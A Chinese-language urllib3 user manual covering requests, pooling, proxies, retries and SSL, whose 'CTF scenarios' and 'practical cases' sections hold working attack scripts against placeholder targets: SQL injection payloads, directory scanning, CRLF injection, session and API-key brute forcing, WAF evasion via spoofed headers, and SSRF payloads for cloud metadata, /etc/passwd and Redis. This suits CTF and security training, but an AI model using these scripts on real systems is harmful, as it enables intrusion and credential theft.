# urllib3 使用手册（Python HTTP客户端库）

> urllib3 是一个功能强大的 Python HTTP 客户端库，提供了连接池、SSL/TLS验证、自动重试等高级功能。

---

## 目录
1. [概述](#概述)
2. [安装方法](#安装方法)
3. [基本用法](#基本用法)
4. [核心功能](#核心功能)
5. [高级特性](#高级特性)
6. [CTF常见场景](#ctf常见场景)
7. [实战案例](#实战案例)
8. [常见问题](#常见问题)
9. [参考资源](#参考资源)

---

## 概述

urllib3 是一个用户友好的 HTTP 客户端库，比标准库的 urllib 更强大：
- **连接池管理**：自动管理和重用连接
- **客户端 SSL/TLS 验证**：支持证书验证
- **自动重试**：可配置的请求重试机制
- **多部分编码**：支持文件上传
- **Helper 方法**：简化常见 HTTP 操作

**适用场景**：
- Web 爬虫开发
- API 接口调用
- CTF Web 题目（SQL注入、XSS、SSRF）
- 网络请求测试

**版本信息**：本手册基于 urllib3 v2.0+

---

## 安装方法

### 基本安装
```bash
# 使用 pip 安装
pip install urllib3

# 安装指定版本
pip install urllib3==2.0.0

# 升级到最新版
pip install --upgrade urllib3
```

### 验证安装
```python
import urllib3
print(urllib3.__version__)
```

### 额外依赖
```bash
# 安装 SOCKS 代理支持
pip install urllib3[socks]

# 安装 Brotli 压缩支持
pip install urllib3[brotli]

# 安装所有可选依赖
pip install urllib3[socks,brotli]
```

---

## 基本用法

### 简单 GET 请求

```python
import urllib3

# 创建 PoolManager
http = urllib3.PoolManager()

# 发送 GET 请求
response = http.request('GET', 'http://httpbin.org/get')

# 打印响应
print(response.status)          # 200
print(response.data.decode())   # 响应内容
print(response.headers)         # 响应头
```

### 简单 POST 请求

```python
import urllib3
import json

http = urllib3.PoolManager()

# POST 表单数据
data = {'key': 'value', 'username': 'admin'}
response = http.request(
    'POST',
    'http://httpbin.org/post',
    fields=data
)

# POST JSON 数据
headers = {'Content-Type': 'application/json'}
json_data = json.dumps({'key': 'value'})
response = http.request(
    'POST',
    'http://httpbin.org/post',
    body=json_data,
    headers=headers
)
```

### 设置请求头

```python
import urllib3

http = urllib3.PoolManager()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept': 'text/html,application/json',
    'Authorization': 'Bearer YOUR_TOKEN'
}

response = http.request(
    'GET',
    'http://httpbin.org/headers',
    headers=headers
)
```

---

## 核心功能

### 1. 连接池管理

**PoolManager**：
```python
import urllib3

# 创建连接池（默认10个连接）
http = urllib3.PoolManager(
    num_pools=10,           # 连接池数量
    maxsize=10,             # 每个池的最大连接数
    block=False,            # 池满时是否阻塞
    timeout=5.0             # 超时时间
)

# 发送请求（自动管理连接）
response = http.request('GET', 'http://example.com')
```

**ProxyManager（代理）**：
```python
import urllib3

# HTTP 代理
proxy = urllib3.ProxyManager('http://proxy.example.com:8080')
response = proxy.request('GET', 'http://example.com')

# 带认证的代理
proxy_url = 'http://user:pass@proxy.example.com:8080'
proxy = urllib3.ProxyManager(proxy_url)

# SOCKS 代理
from urllib3.contrib.socks import SOCKSProxyManager
proxy = SOCKSProxyManager('socks5://localhost:1080')
response = proxy.request('GET', 'http://example.com')
```

### 2. 超时控制

```python
import urllib3

http = urllib3.PoolManager()

# 设置总超时
response = http.request('GET', 'http://httpbin.org/delay/3', timeout=5.0)

# 分别设置连接和读取超时
from urllib3.util.timeout import Timeout
timeout = Timeout(connect=2.0, read=5.0)
response = http.request('GET', 'http://httpbin.org/delay/3', timeout=timeout)

# 禁用超时
response = http.request('GET', 'http://example.com', timeout=None)
```

### 3. 重试机制

```python
import urllib3
from urllib3.util.retry import Retry

# 配置重试策略
retry = Retry(
    total=3,                    # 最大重试次数
    read=3,                     # 读取错误重试
    connect=3,                  # 连接错误重试
    backoff_factor=0.3,         # 重试间隔因子
    status_forcelist=[500, 502, 503, 504],  # 触发重试的状态码
    allowed_methods=['GET', 'POST']         # 允许重试的方法
)

http = urllib3.PoolManager(retries=retry)
response = http.request('GET', 'http://httpbin.org/status/500')
```

### 4. SSL/TLS 配置

```python
import urllib3
import certifi

# 使用系统证书
http = urllib3.PoolManager(
    cert_reqs='CERT_REQUIRED',
    ca_certs=certifi.where()
)

# 禁用 SSL 验证（不推荐，仅测试用）
urllib3.disable_warnings()
http = urllib3.PoolManager(cert_reqs='CERT_NONE')

# 使用自定义证书
http = urllib3.PoolManager(
    cert_file='/path/to/client.crt',
    key_file='/path/to/client.key',
    ca_certs='/path/to/ca-bundle.crt'
)
```

### 5. 文件上传

```python
import urllib3

http = urllib3.PoolManager()

# 上传单个文件
with open('file.txt', 'rb') as f:
    response = http.request(
        'POST',
        'http://httpbin.org/post',
        fields={
            'file': ('filename.txt', f.read(), 'text/plain')
        }
    )

# 上传多个文件
with open('file1.txt', 'rb') as f1, open('file2.txt', 'rb') as f2:
    response = http.request(
        'POST',
        'http://httpbin.org/post',
        fields={
            'file1': ('file1.txt', f1.read(), 'text/plain'),
            'file2': ('file2.txt', f2.read(), 'text/plain'),
            'field': 'value'
        }
    )
```

### 6. Cookie 管理

```python
import urllib3

http = urllib3.PoolManager()

# 发送 Cookie
headers = {'Cookie': 'session=abc123; user=admin'}
response = http.request('GET', 'http://example.com', headers=headers)

# 获取响应中的 Cookie
set_cookie = response.headers.get('Set-Cookie')
print(set_cookie)
```

---

## 高级特性

### 1. 流式下载

```python
import urllib3

http = urllib3.PoolManager()

# 流式读取大文件
response = http.request(
    'GET',
    'http://example.com/large_file.zip',
    preload_content=False  # 不预加载内容
)

# 分块读取
with open('downloaded_file.zip', 'wb') as f:
    for chunk in response.stream(1024 * 1024):  # 1MB chunks
        f.write(chunk)

# 释放连接
response.release_conn()
```

### 2. 自定义请求头

```python
import urllib3

http = urllib3.PoolManager()

# 常见请求头
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Referer': 'http://example.com',
    'X-Requested-With': 'XMLHttpRequest'  # AJAX 请求
}

response = http.request('GET', 'http://example.com', headers=headers)
```

### 3. 响应处理

```python
import urllib3
import json

http = urllib3.PoolManager()
response = http.request('GET', 'http://httpbin.org/json')

# 状态码
print(response.status)          # 200

# 响应头
print(response.headers)
print(response.headers['Content-Type'])

# 响应内容
print(response.data)            # bytes
print(response.data.decode())   # str

# JSON 解析
json_data = json.loads(response.data.decode())

# 检查重定向
if response.get_redirect_location():
    print(f"Redirected to: {response.get_redirect_location()}")
```

### 4. 自定义重定向

```python
import urllib3

http = urllib3.PoolManager()

# 禁用自动重定向
response = http.request(
    'GET',
    'http://httpbin.org/redirect/3',
    redirect=False
)
print(response.status)  # 302

# 手动处理重定向
location = response.get_redirect_location()
if location:
    response = http.request('GET', location)
```

---

## CTF常见场景

### 场景1：SQL注入自动化

```python
import urllib3
import urllib.parse

http = urllib3.PoolManager()

# SQL 注入 Payload
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "admin'--",
    "' UNION SELECT NULL--",
]

url = 'http://target.com/login'

for payload in payloads:
    data = {
        'username': payload,
        'password': 'password'
    }

    response = http.request('POST', url, fields=data)

    if 'Welcome' in response.data.decode():
        print(f"[+] Success with payload: {payload}")
        break
    else:
        print(f"[-] Failed: {payload}")
```

### 场景2：目录扫描

```python
import urllib3
import time

http = urllib3.PoolManager()

# 常见目录列表
directories = [
    'admin', 'backup', 'config', 'database', 'uploads',
    'test', 'dev', 'api', 'private', '.git'
]

base_url = 'http://target.com'

for directory in directories:
    url = f"{base_url}/{directory}/"

    try:
        response = http.request('GET', url, timeout=3.0, redirect=False)

        if response.status == 200:
            print(f"[+] Found: {url} (Status: {response.status})")
        elif response.status == 403:
            print(f"[!] Forbidden: {url}")
        elif response.status in [301, 302]:
            print(f"[>] Redirect: {url} -> {response.get_redirect_location()}")

    except Exception as e:
        print(f"[-] Error: {url} - {e}")

    time.sleep(0.1)  # 避免请求过快
```

### 场景3：HTTP 头部注入

```python
import urllib3

http = urllib3.PoolManager()

# CRLF 注入测试
payloads = [
    "test\r\nX-Injected: true",
    "test\nSet-Cookie: admin=true",
    "test%0d%0aX-Injected: true"
]

for payload in payloads:
    headers = {'X-Custom-Header': payload}

    try:
        response = http.request(
            'GET',
            'http://target.com/reflect',
            headers=headers
        )

        if 'X-Injected' in response.headers:
            print(f"[+] CRLF Injection successful!")
            break
    except Exception as e:
        print(f"[-] Failed: {e}")
```

### 场景4：Cookie 爆破

```python
import urllib3
import itertools
import string

http = urllib3.PoolManager()

# 爆破 session cookie（假设是4位数字）
url = 'http://target.com/admin'

for session_id in range(1000, 2000):
    headers = {'Cookie': f'PHPSESSID={session_id}'}

    response = http.request('GET', url, headers=headers)

    if response.status == 200 and 'Admin Panel' in response.data.decode():
        print(f"[+] Valid session: {session_id}")
        break

    if session_id % 100 == 0:
        print(f"[*] Tried: {session_id}")
```

---

## 实战案例

### 案例1：绕过 WAF

```python
import urllib3
import random
import time

http = urllib3.PoolManager()

# User-Agent 轮换
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
]

def bypass_waf_request(url, payload):
    headers = {
        'User-Agent': random.choice(user_agents),
        'X-Forwarded-For': f"10.0.0.{random.randint(1, 255)}",
        'X-Real-IP': f"192.168.1.{random.randint(1, 255)}",
    }

    # 延迟请求
    time.sleep(random.uniform(0.5, 2.0))

    response = http.request('GET', url, headers=headers)
    return response

# 使用示例
response = bypass_waf_request('http://target.com/api?id=1', "' OR 1=1--")
```

### 案例2：API 密钥爆破

```python
import urllib3
import string
import itertools

http = urllib3.PoolManager()

def generate_api_keys(length=4):
    """生成所有可能的 API key（示例：仅数字）"""
    chars = string.digits
    for combination in itertools.product(chars, repeat=length):
        yield ''.join(combination)

def test_api_key(api_key):
    url = f"http://api.example.com/data?key={api_key}"

    try:
        response = http.request('GET', url, timeout=5.0)

        if response.status == 200:
            return True, response.data.decode()
        elif response.status == 401:
            return False, "Invalid key"
        else:
            return False, f"Status: {response.status}"
    except Exception as e:
        return False, str(e)

# 爆破 API key
for i, api_key in enumerate(generate_api_keys(4)):
    is_valid, message = test_api_key(api_key)

    if is_valid:
        print(f"[+] Valid API Key found: {api_key}")
        print(f"[+] Response: {message}")
        break

    if i % 100 == 0:
        print(f"[*] Tested: {i} keys")
```

### 案例3：SSRF 利用

```python
import urllib3

http = urllib3.PoolManager()

# SSRF Payload
ssrf_payloads = [
    'http://127.0.0.1/admin',
    'http://localhost:8080/status',
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata
    'file:///etc/passwd',
    'gopher://127.0.0.1:6379/_INFO'  # Redis
]

url = 'http://target.com/fetch'

for payload in ssrf_payloads:
    data = {'url': payload}

    try:
        response = http.request('POST', url, fields=data, timeout=10.0)

        content = response.data.decode()

        if response.status == 200 and len(content) > 10:
            print(f"[+] SSRF Success!")
            print(f"[+] Payload: {payload}")
            print(f"[+] Response: {content[:200]}")
            break
    except Exception as e:
        print(f"[-] Failed: {payload} - {e}")
```

---

## 常见问题

### 问题1：SSL 证书验证错误

**错误信息**：`SSLError: certificate verify failed`

**解决方案**：
```python
import urllib3

# 方法1：安装 certifi
import certifi
http = urllib3.PoolManager(ca_certs=certifi.where())

# 方法2：禁用验证（仅测试）
urllib3.disable_warnings()
http = urllib3.PoolManager(cert_reqs='CERT_NONE')
```

### 问题2：连接池耗尽

**错误信息**：`ConnectionPool is full`

**解决方案**：
```python
# 增加连接池大小
http = urllib3.PoolManager(maxsize=50)

# 或手动释放连接
response = http.request('GET', url, preload_content=False)
response.release_conn()
```

### 问题3：超时错误

**解决方案**：
```python
from urllib3.util.timeout import Timeout

# 设置更长的超时
timeout = Timeout(connect=10.0, read=30.0)
http = urllib3.PoolManager(timeout=timeout)
```

---

## 参考资源

### 官方文档
- **urllib3 官网**：https://urllib3.readthedocs.io/
- **GitHub**：https://github.com/urllib3/urllib3
- **PyPI**：https://pypi.org/project/urllib3/

### 教程和示例
- **urllib3 User Guide**：https://urllib3.readthedocs.io/en/stable/user-guide.html
- **Advanced Usage**：https://urllib3.readthedocs.io/en/stable/advanced-usage.html

### 相关库
- **requests**：https://requests.readthedocs.io/（基于 urllib3）
- **httpx**：https://www.python-httpx.org/（异步支持）
- **aiohttp**：https://docs.aiohttp.org/（异步 HTTP）

---

## 快速参考

### 基本请求
```python
import urllib3

http = urllib3.PoolManager()

# GET
response = http.request('GET', 'http://example.com')

# POST
response = http.request('POST', 'http://example.com', fields={'key': 'value'})

# 带 headers
headers = {'User-Agent': 'Custom'}
response = http.request('GET', 'http://example.com', headers=headers)
```

### 常用配置
```python
# 超时
http.request('GET', url, timeout=5.0)

# 重试
from urllib3.util.retry import Retry
retry = Retry(total=3, backoff_factor=0.3)
http = urllib3.PoolManager(retries=retry)

# 代理
proxy = urllib3.ProxyManager('http://proxy:8080')

# 禁用 SSL 验证
urllib3.disable_warnings()
http = urllib3.PoolManager(cert_reqs='CERT_NONE')
```

---

**文档版本**：v1.0
**更新日期**：2025-01
**适用版本**：urllib3 v2.0+
